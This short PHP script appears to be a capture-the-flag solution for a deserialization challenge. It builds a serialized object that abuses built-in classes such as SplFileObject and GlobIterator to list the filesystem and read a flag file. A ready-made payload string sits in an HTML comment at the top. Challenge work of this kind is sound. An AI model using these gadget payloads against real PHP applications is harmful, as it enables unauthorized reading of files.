<!-- O:1:"A":3:{s:1:"a";s:13:"SplFileObject";s:1:"b";s:12:"/fl1aaaaaaa9";} -->


<?php
highlight_file(__FILE__);

class A
{
    public $a;
    public $b;

    public function __destruct()
    {
        echo new $this->a($this->b);    
    }
}

$exp=new A();
// $exp->a='GlobIterator'; //DirectoryIterator FilesystemIterator SplFileObject  GlobIterator ReflectionClass ReflectionMethod
// // $exp->b='/bin/znew';   // glob:///*
// $exp->b='/*f*';   // glob:///*   fl1aaaaaaa9

$exp->a='SplFileObject'; //DirectoryIterator FilesystemIterator SplFileObject  GlobIterator ReflectionClass ReflectionMethod
$exp->b='/fl1aaaaaaa9';   // glob:///*   fl1aaaaaaa9
// echo new $exp->a($exp->b);
echo(serialize($exp));

